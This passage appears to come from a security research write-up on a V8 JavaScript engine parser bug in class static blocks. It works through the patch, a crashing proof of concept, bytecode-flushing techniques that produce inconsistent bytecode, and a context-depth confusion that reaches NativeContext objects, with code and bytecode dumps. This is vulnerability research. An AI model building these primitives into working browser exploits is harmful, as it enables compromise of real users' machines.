</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   FunctionState initializer_state(&amp;function_state_, &amp;scope_, initializer_scope);
</span></span><span class=line><span class=cl><span class=gi>+  FunctionParsingScope body_parsing_scope(impl());
</span></span></span><span class=line><span class=cl><span class=gi></span>   AcceptINScope accept_in(this, true);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   // Each static block has its own var and lexical scope, so make a new var
</span></span></code></pre></div><p>The patch is very simple, the actual effective fix is just one line of code. This line introduces a variable of type <code>FunctionParsingScope</code> when parsing the <a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes/Static_initialization_blocks>static initialization block</a> of a class. Let&rsquo;s examine what this newly introduced variable does:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl>  <span class=k>class</span> <span class=nc>V8_NODISCARD</span> <span class=n>FunctionParsingScope</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=k>explicit</span> <span class=n>FunctionParsingScope</span><span class=p>(</span><span class=n>Impl</span><span class=o>*</span> <span class=n>parser</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=o>:</span> <span class=n>parser_</span><span class=p>(</span><span class=n>parser</span><span class=p>),</span> <span class=n>expression_scope_</span><span class=p>(</span><span class=n>parser_</span><span class=o>-&gt;</span><span class=n>expression_scope_</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>parser_</span><span class=o>-&gt;</span><span class=n>expression_scope_</span> <span class=o>=</span> <span class=k>nullptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>~</span><span class=n>FunctionParsingScope</span><span class=p>()</span> <span class=p>{</span> <span class=n>parser_</span><span class=o>-&gt;</span><span class=n>expression_scope_</span> <span class=o>=</span> <span class=n>expression_scope_</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=k>private</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=n>Impl</span><span class=o>*</span> <span class=n>parser_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>ExpressionScope</span><span class=o>*</span> <span class=n>expression_scope_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>};</span>
</span></span></code></pre></div><p>This is an extremely simple class. What it does is store the current <code>expression_scope_</code> in the <code>parser_</code> when constructed and restore it when destructed. So the key point here is the <code>ExpressionScope</code>.</p><p>During the syntax analysis phase, the parser divides different parts of the script into different <a href=https://developer.mozilla.org/en-US/docs/Glossary/Scope>Scopes</a>. Simply put, Scope divides the range of variable usage. JavaScript has many different types of Scopes, such as Global scope, Module scope, Function scope, etc.</p><p>To better parse variables in different Scopes, developers introduced the concept of <code>ExpressionScope</code>. You can refer to this <a href=https://docs.google.com/document/d/1FAvEp9EUK-G8kHfDIEo_385Hs2SUBCYbJ5H-NnLvq8M/edit>official document</a> for a detailed concept. It is worth mentioning that <code>ExpressionScope</code> in V8 is a completely different concept from <code>Scope</code> despite their similar names. <code>ExpressionScope</code> is an intermediate variable that exists to facilitate parsing and is used to generate the actual <code>Scope</code> in the AST. Like <code>Scope</code>, <code>ExpressionScope</code> indexes the outer layers through its parent.</p><p>Returning to this vulnerability, the newly added <code>FunctionParsingScope</code> variable blocks the <code>ExpressionScope</code> chain from indexing its parent. Therefore, the original vulnerability likely caused unexpected behavior in the parent <code>ExpressionScope</code>. Almost the only suspect function that references the parent is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl>  <span class=kt>void</span> <span class=nf>RecordThisUse</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>ExpressionScope</span><span class=o>*</span> <span class=n>scope</span> <span class=o>=</span> <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>scope</span><span class=o>-&gt;</span><span class=n>IsArrowHeadParsingScope</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>scope</span><span class=o>-&gt;</span><span class=n>AsArrowHeadParsingScope</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>RecordThisUse</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=n>scope</span> <span class=o>=</span> <span class=n>scope</span><span class=o>-&gt;</span><span class=n>parent</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>scope</span> <span class=o>!=</span> <span class=k>nullptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span></code></pre></div><p>Let&rsquo;s check where this function is called:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl>  <span class=c1>// Needs to be called if the reference needs to be available from the current
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// point. It causes the receiver to be context allocated if necessary.
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// Returns the receiver variable that we&#39;re referencing.
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>V8_INLINE</span> <span class=n>Variable</span><span class=o>*</span> <span class=nf>UseThis</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>var</span><span class=o>-&gt;</span><span class=n>set_is_used</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>closure_scope</span> <span class=o>==</span> <span class=n>receiver_scope</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=c1>// It&#39;s possible that we&#39;re parsing the head of an arrow function, in
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=c1>// which case we haven&#39;t realized yet that closure_scope !=
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=c1>// receiver_scope. Mark through the ExpressionScope for now.
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>expression_scope</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>RecordThisUse</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>}</span>
</span></span></code></pre></div><p>This function handles a special variable <code>this</code> in JavaScript. In traditional functions, the <code>this</code> variable cannot be passed between function calls, such as:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>showThis</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>innerThis</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=k>this</span> <span class=o>==</span> <span class=nx>innerThis</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>obj</span> <span class=o>=</span> <span class=p>{};</span>
</span></span><span class=line><span class=cl><span class=nx>obj</span><span class=p>.</span><span class=nx>showThis</span> <span class=o>=</span> <span class=nx>showThis</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>obj</span><span class=p>.</span><span class=nx>showThis</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=c1>// output: false
</span></span></span></code></pre></div><p>However, the arrow function introduced in ES6 solves this problem. The arrow function can normally use the outer <code>this</code> variable. To support this feature, parsing <code>this</code> requires special handling. As noted in the <code>UseThis</code> function, when V8 encounters the <code>this</code> variable, if the inner and outer Scopes are the same, it is possible that the parameters of an arrow function are being parsed, as shown in the following code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>foo</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>(</span><span class=nx>arg</span> <span class=o>=</span> <span class=k>this</span><span class=p>.</span><span class=nx>a</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span> <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>arg</span><span class=p>);</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Since the arrow function&rsquo;s Scope has not yet been allocated at this point, <code>ExpressionScope</code> is used to mark the usage of the <code>this</code> variable here, so that the <code>this</code> variable can be correctly allocated when the Scope is later assigned. In <code>RecordThisUse</code>, the function marks all parent <code>ExpressionScope</code> as using <code>this</code>.</p><p>Now, recalling the transmission of <code>this</code>, it should be blocked during the function call process. The class static block should also be considered a function block. Therefore, the problem here is: using <code>this</code> in a class static block, transmitted through the <code>ExpressionScope</code> chain, will incorrectly mark the outer function as using <code>this</code>. The PoC is as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>f1</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>(</span><span class=nx>arg</span> <span class=o>=</span> <span class=kr>class</span> <span class=nx>AAA</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>static</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>})</span> <span class=p>=&gt;</span> <span class=p>{</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>f1</span><span class=p>();</span>
</span></span></code></pre></div><p>Since the outer function <code>f1</code> does not actually use <code>this</code>, but it is marked as <code>has_forced_context_allocation</code>, triggering a DCHECK when allocating this variable.</p><img src=assets/image-20240628192130458.png style=display:block;margin-left:auto;margin-right:auto;zoom:70%><h2 id=constructing-inconsistent-bytecode>Constructing Inconsistent Bytecode<a hidden class=anchor aria-hidden=true href=#constructing-inconsistent-bytecode>#</a></h2><p>What kind of chaos can such a tiny error cause in the V8 engine? Let&rsquo;s delve deeper into the generated bytecode.</p><p>Construct the following function:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>f1</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>foo</span><span class=p>()</span> <span class=p>{</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>(</span><span class=nx>arg</span> <span class=o>=</span> <span class=kr>class</span> <span class=nx>AAA</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>static</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>})</span> <span class=p>=&gt;</span> <span class=p>{</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The bytecode generated after the bug fix in the new version:</p><pre tabindex=0><code class=language-assembly data-lang=assembly>[generated bytecode for function: f1 (0x234800198559 &lt;SharedFunctionInfo f1&gt;)]
Bytecode length: 6
Parameter count 1
Register count 0
Frame size 0
   40 S&gt; 0xee0000400a4 @    0 : 85 00 00 02       CreateClosure [0], [0], #2
         0xee0000400a8 @    4 : 0e                LdaUndefined
  102 S&gt; 0xee0000400a9 @    5 : af                Return
Constant pool (size = 1)
0xee000040071: [TrustedFixedArray]
 - map: 0x234800000595 &lt;Map(TRUSTED_FIXED_ARRAY_TYPE)&gt;
 - length: 1
           0: 0x2348001986a1 &lt;SharedFunctionInfo&gt;
</code></pre><p>The problematic bytecode in the old version:</p><pre tabindex=0><code class=language-assembly data-lang=assembly>[generated bytecode for function: f1 (0x0e2b0019ab81 &lt;SharedFunctionInfo f1&gt;)]
Bytecode length: 15
Parameter count 1
Register count 1
Frame size 8
Bytecode age: 0
   19 E&gt; 0xe2b0019adc2 @    0 : 84 00 01          CreateFunctionContext [0], [1]
         0xe2b0019adc5 @    3 : 1a fa             PushContext r0
         0xe2b0019adc7 @    5 : 0b 02             Ldar &lt;this&gt;
         0xe2b0019adc9 @    7 : 25 02             StaCurrentContextSlot [2]
   63 S&gt; 0xe2b0019adcb @    9 : 81 01 00 02       CreateClosure [1], [0], #2
         0xe2b0019adcf @   13 : 0e                LdaUndefined
  155 S&gt; 0xe2b0019add0 @   14 : aa                Return
Constant pool (size = 2)
0xe2b0019ad91: [FixedArray] in OldSpace
 - map: 0x0e2b00000089 &lt;Map(FIXED_ARRAY_TYPE)&gt;
 - length: 2
           0: 0x0e2b0019ad2d &lt;ScopeInfo FUNCTION_SCOPE&gt;
           1: 0x0e2b0019ad5d &lt;SharedFunctionInfo&gt;
</code></pre><p>As mentioned in the previous section, even if <code>this</code> is not used in the function <code>f1</code>, the bytecode still forcibly allocates the <code>this</code> variable. Here’s a detailed explanation of its bytecode:</p><ol><li><code>CreateFunctionContext</code> creates a function context.</li><li><code>PushContext</code> replaces the current context with the newly created one, saving the old context.</li><li><code>Ldar</code> loads <code>this</code> into the accumulator.</li><li><code>StaCurrentContextSlot</code> stores the value in the accumulator into slot 2 of the current context.</li></ol><p>However, our goal is to achieve bytecode inconsistency within a single script execution to make it exploitable. After studying the PoC and <a href=https://github.com/bjrjk/CVE-2022-4262/blob/main/FA/FA.md>analysis</a> of <a href=https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-4262.html>CVE-2022-4262</a>, leveraging the Bytecode flushing mechanism seems like a good idea. In V8, if a function remains unused after multiple garbage collections (GC), its bytecode will be reclaimed. When executed again, the parser will use previously stored results to regenerate the bytecode more quickly. For example, when parsing the head of an arrow function, the parser does not know whether it is dealing with a variable assignment or an arrow function parameter declaration during the first bytecode generation. However, in subsequent handling, it can determine that it is the head of an arrow function.</p><p>With this foundational knowledge, we actively triggered Bytecode flushing and successfully constructed inconsistent bytecode across two executions:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>f1</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>flush_bytecode</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>f1</span><span class=p>();</span>
</span></span></code></pre></div><p>The bytecode of function <code>f1</code> after flushing is consistent with the bytecode after the bug fix, i.e., it lacks the four bytecode instructions for constructing the Function Context.</p><h2 id=failed-attempt-records>Failed Attempt Records<a hidden class=anchor aria-hidden=true href=#failed-attempt-records>#</a></h2><blockquote><p>This section does not affect the subsequent content. Readers can skip to the next section.</p></blockquote><p>In reality, our research was not smooth sailing. Before constructing a practically useful inconsistency, we spent a considerable amount of time attempting another form of bytecode inconsistency.</p><p>Initially, we observed the erroneous bytecode, which essentially stored an unnecessary <code>this</code> in the Function Context. The first idea that came to mind was: if there are other variables in the Function Context, due to the bytecode inconsistency, if an inner function uses the same slot index to access variables, some unexpected behavior might occur.</p><p>With this idea, we constructed the following PoC:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>f1</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>a0</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>a1</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>f2</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;a0 = &#39;</span> <span class=o>+</span> <span class=nx>a0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;a1 = &#39;</span> <span class=o>+</span> <span class=nx>a1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>hax</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>a0</span> <span class=o>=</span> <span class=mh>0x1337</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=p>(</span><span class=nx>arg</span> <span class=o>=</span> <span class=kr>class</span> <span class=nx>AAA</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>static</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>})</span> <span class=p>=&gt;</span> <span class=p>{</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>hax</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nx>f2</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>hax</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// keep a reference to hax to make it consistent after flushing
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>let</span> <span class=nx>hax</span> <span class=o>=</span> <span class=nx>f1</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>flush_bytecode</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;after flush&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>f1</span><span class=p>();</span>
</span></span></code></pre></div><p>The output result is:</p><pre tabindex=0><code>a0 = 4919
a1 = 1
after flush
a0 = 0
a1 = 4919
</code></pre><p>As we can see, during the second execution, even though the object being assigned is <code>a0</code>, it is actually <code>a1</code> that gets modified. Let&rsquo;s inspect the bytecode of the function <code>hax</code>:</p><pre tabindex=0><code class=language-assembly data-lang=assembly>[generated bytecode for function: hax (0x2e72000db2ed &lt;SharedFunctionInfo hax&gt;)]
Bytecode length: 15
Parameter count 1
Register count 1
Frame size 8
Bytecode age: 0
  763 S&gt; 0x2e72000dc35e @    0 : 00 0d 37 13       LdaSmi.Wide [4919]
         0x2e72000dc362 @    4 : c5                Star0
         0x2e72000dc363 @    5 : 16 03             LdaCurrentContextSlot [3]
  766 E&gt; 0x2e72000dc365 @    7 : ab 00             ThrowReferenceErrorIfHole [0]
         0x2e72000dc367 @    9 : 0b fa             Ldar r0
         0x2e72000dc369 @   11 : 25 03             StaCurrentContextSlot [3]
         0x2e72000dc36b @   13 : 0e                LdaUndefined
  778 S&gt; 0x2e72000dc36c @   14 : aa                Return
Constant pool (size = 1)
0x2e72000dc331: [FixedArray] in OldSpace
 - map: 0x2e7200000089 &lt;Map(FIXED_ARRAY_TYPE)&gt;
 - length: 1
           0: 0x2e72000dad51 &lt;String[2]: #a0&gt;
</code></pre><p>The bytecode generated for <code>hax</code> is the same both times, consistently reading the variable from slot 3 of the current Context. This is not an issue during the first execution because <code>this</code> is stored in slot 2 and <code>a0</code> is stored in slot 3. However, during the second execution, V8 generates the correct bytecode for <code>f1</code>, where <code>a0</code> is in slot 2 and <code>a1</code> is in slot 3. The bytecode for <code>hax</code> does not update correctly, leading to the unexpected result above.</p><p>We attempted to exploit this bug to cause further type confusion, but all our methods failed:</p><ol><li>We tried leveraging JIT optimization for accessing <code>a0</code>, then using the JIT-compiled function to access <code>a1</code> after triggering the bug. However, this approach was not feasible, as variable modifications at the bytecode level are visible to the JIT engine.</li><li>We attempted to use unexpected bytecode to access another variable, such as the following scenario: bytecode Foo only accepts parameters of type A, and using parameters of type B would cause type confusion. However, bytecode, being a higher-level construct, validates input parameter types, and the desired bytecode did not exist.</li></ol><h2 id=exploiting-bytecode-inconsistency>Exploiting Bytecode Inconsistency<a hidden class=anchor aria-hidden=true href=#exploiting-bytecode-inconsistency>#</a></h2><h3 id=another-unexpected-behavior>Another Unexpected Behavior<a hidden class=anchor aria-hidden=true href=#another-unexpected-behavior>#</a></h3><p>By examining the bytecode generated in two different instances, we observed the distinction lies in the presence or absence of the Function Context. Studying the bytecode revealed that there are two ways to load from the Context: <code>LdaCurrentContextSlot</code> and <code>LdaContextSlot</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// comments from src/interpreter/interpreter-generator.cc
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>LdaCurrentContextSlot</span> <span class=o>&lt;</span><span class=nx>slot_index</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=nx>Load</span> <span class=nx>the</span> <span class=nx>object</span> <span class=k>in</span> <span class=o>|</span><span class=nx>slot_index</span><span class=o>|</span> <span class=k>of</span> <span class=nx>the</span> <span class=nx>current</span> <span class=nx>context</span> <span class=nx>into</span> <span class=nx>the</span> <span class=nx>accumulator</span><span class=p>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>LdaContextSlot</span> <span class=o>&lt;</span><span class=nx>context</span><span class=o>&gt;</span> <span class=o>&lt;</span><span class=nx>slot_index</span><span class=o>&gt;</span> <span class=o>&lt;</span><span class=nx>depth</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=nx>Load</span> <span class=nx>the</span> <span class=nx>object</span> <span class=k>in</span> <span class=o>|</span><span class=nx>slot_index</span><span class=o>|</span> <span class=k>of</span> <span class=nx>the</span> <span class=nx>context</span> <span class=nx>at</span> <span class=o>|</span><span class=nx>depth</span><span class=o>|</span> <span class=k>in</span> <span class=nx>the</span> <span class=nx>context</span>
</span></span><span class=line><span class=cl><span class=nx>chain</span> <span class=nx>starting</span> <span class=nx>at</span> <span class=o>|</span><span class=nx>context</span><span class=o>|</span> <span class=nx>into</span> <span class=nx>the</span> <span class=nx>accumulator</span><span class=p>.</span>
</span></span></code></pre></div><p>Clearly, <code>LdaContextSlot</code> is more complex. Since context storage is stack-based, <code>LdaContextSlot</code> provides a more general way to load, allowing manual specification of the starting context and the required depth.</p><p>For instance, the following bytecode is a common combination to load a value:</p><pre tabindex=0><code class=language-assembly data-lang=assembly> 2807 S&gt; 0x1541001a24ba @    0 : 14 ff 70 01       LdaContextSlot &lt;context&gt;, [10], [1]
         0x1541001a24be @    4 : ab 00             ThrowReferenceErrorIfHole [0]
         0x1541001a24c0 @    6 : c5                Star0
</code></pre><p>Reflecting on the differences in bytecode generation, a new idea emerged: What if, during the second bytecode generation, no new Function Context was created, and the inner function <code>LdaContextSlot</code> retained the old depth? What would happen then?</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>let</span> <span class=nx>o0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>f1</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>hax</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>o0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></div><p>The bytecode for the function <code>hax</code> is as follows:</p><pre tabindex=0><code class=language-assembly data-lang=assembly>[generated bytecode for function: hax (0x00f9000de775 &lt;SharedFunctionInfo hax&gt;)]
Bytecode length: 14
Parameter count 1
Register count 1
Frame size 8
Bytecode age: 0
 2602 S&gt; 0xf9000e1256 @    0 : 14 ff 02 01       LdaContextSlot &lt;context&gt;, [2], [1]
         0xf9000e125a @    4 : ab 00             ThrowReferenceErrorIfHole [0]
         0xf9000e125c @    6 : c5                Star0
         0xf9000e125d @    7 : 65 aa 01 fa 01    CallRuntime [DebugPrint], r0-r0
         0xf9000e1262 @   12 : 0e                LdaUndefined
 2621 S&gt; 0xf9000e1263 @   13 : aa                Return
Constant pool (size = 1)
0xf9000e1229: [FixedArray] in OldSpace
 - map: 0x00f900000089 &lt;Map(FIXED_ARRAY_TYPE)&gt;
 - length: 1
           0: 0x00f9000dad2d &lt;String[2]: #o0&gt;
</code></pre><p>The output result is surprising:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>DebugPrint</span><span class=o>:</span> <span class=mh>0xf9000d4089</span><span class=o>:</span> <span class=p>[</span><span class=nx>JSGlobalObject</span><span class=p>]</span> <span class=k>in</span> <span class=nx>OldSpace</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nx>map</span><span class=o>:</span> <span class=mh>0x00f9000d8395</span> <span class=o>&lt;</span><span class=nx>Map</span><span class=p>[</span><span class=mi>20</span><span class=p>](</span><span class=nx>HOLEY_ELEMENTS</span><span class=p>)</span><span class=o>&gt;</span> <span class=p>[</span><span class=nx>DictionaryProperties</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nx>prototype</span><span class=o>:</span> <span class=mh>0x00f900092b7d</span> <span class=o>&lt;</span><span class=nb>Object</span> <span class=nx>map</span> <span class=o>=</span> <span class=mh>0xf9000d46a5</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nx>elements</span><span class=o>:</span> <span class=mh>0x00f900000219</span> <span class=o>&lt;</span><span class=nx>FixedArray</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>&gt;</span> <span class=p>[</span><span class=nx>HOLEY_ELEMENTS</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=kr>native</span> <span class=nx>context</span><span class=o>:</span> <span class=mh>0x00f9000c3c2d</span> <span class=o>&lt;</span><span class=nx>NativeContext</span><span class=p>[</span><span class=mi>281</span><span class=p>]</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nx>global</span> <span class=nx>proxy</span><span class=o>:</span> <span class=mh>0x00f9000c3bf5</span> <span class=o>&lt;</span><span class=nx>JSGlobalProxy</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nx>properties</span><span class=o>:</span> <span class=mh>0x00f9000e0bbd</span> <span class=o>&lt;</span><span class=nx>GlobalDictionary</span><span class=p>[</span><span class=mi>261</span><span class=p>]</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nx>All</span> <span class=nx>own</span> <span class=nx>properties</span> <span class=p>(</span><span class=nx>excluding</span> <span class=nx>elements</span><span class=p>)</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nx>Uint8Array</span><span class=o>:</span> <span class=mh>0x00f9000c5be1</span> <span class=o>&lt;</span><span class=nx>JSFunction</span> <span class=nx>Uint8Array</span> <span class=p>(</span><span class=nx>sfi</span> <span class=o>=</span> <span class=mh>0xf90008c131</span><span class=p>)</span><span class=o>&gt;</span> <span class=p>(</span><span class=nx>data</span><span class=p>,</span> <span class=nx>dict_index</span><span class=o>:</span> <span class=mi>30</span><span class=p>,</span> <span class=nx>attrs</span><span class=o>:</span> <span class=p>[</span><span class=nx>W_C</span><span class=p>])</span>
</span></span><span class=line><span class=cl>   <span class=p>...</span>
</span></span></code></pre></div><p>Where does this <code>JSGlobalObject</code> come from?</p><p>The answer lies in the <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/contexts.h;drc=1f14cc876cc5bf899d13284a12c451498219bb2d;l=704">NativeContext</a>. By skipping a layer of the Function Context, we loaded from an outer layer of the expected context, which is the <code>NativeContext</code>.</p><p>Let&rsquo;s slightly modify the script to dump all objects in the <code>NativeContext</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>let</span> <span class=nx>o0</span><span class=p>,</span> <span class=nx>o1</span><span class=p>,</span> <span class=nx>o2</span><span class=p>,</span> <span class=nx>o3</span><span class=p>,</span> <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>f1</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>hax</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>o0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>o1</span><span class=p>);</span>
